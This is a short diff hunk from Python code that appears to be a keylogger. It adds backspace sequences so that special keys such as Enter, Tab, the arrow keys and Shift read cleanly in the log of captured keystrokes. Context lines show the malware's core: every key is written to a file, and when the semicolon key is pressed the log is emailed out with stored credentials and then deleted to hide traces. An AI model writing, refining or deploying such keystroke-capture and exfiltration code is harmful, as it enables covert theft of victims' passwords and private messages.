@@ -214,7 +214,48 @@ try:
       fob.write(event.Key)
       fob.write("\n")
 
-      if event.Ascii==59:
+
+      #this values is to let the output more clean
+      #backspace value
+      if event.Ascii == 8:
+        fob.write("\b\b\b\b\b\b\b\b\b\040")
+      #tab value
+      elif event.Ascii == 9:
+        fob.write("\b\b\b\040")
+      #enter value
+      elif event.Ascii == 13:
+        fob.write("\b\b\b\b\b\b\040")
+      #this is a space value
+      elif event.Ascii == 32:
+        fob.write("\b\b\b\b\b\040")  
+      #left arrow
+      elif event.Ascii == 81:
+        fob.write("\b\b\b\b\040")
+      #up arrow
+      elif event.Ascii == 82:
+        fob.write("\b\b\040")
+      #right arrow
+      elif event.Ascii == 83:
+        fob.write("\b\b\b\b\040")
+      #down arrow
+      elif event.Ascii == 84:
+        fob.write("\b\b\b\b\040")      
+      #shift_l value
+      elif event.Ascii == 225:
+        fob.write("\b\b\b\b\b\b\b\b\040")
+      #shift_r value
+      elif event.Ascii == 226:
+        fob.write("\b\b\b\b\b\b\b\b\040")
+      #control_l value
+      elif event.Ascii == 227:
+        fob.write("\b\b\b\b\b\b\b\b\b\040")
+      #control_r value  
+      elif event.Ascii == 228:
+        fob.write("\b\b\b\b\b\b\b\b\040")
+      #delete value
+      elif event.Ascii == 229:
+        fob.write("\b\b\b\b\b\b\b\b\040")  
+      elif event.Ascii==59:
         fob.close
         send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
         os.remove(log_file)
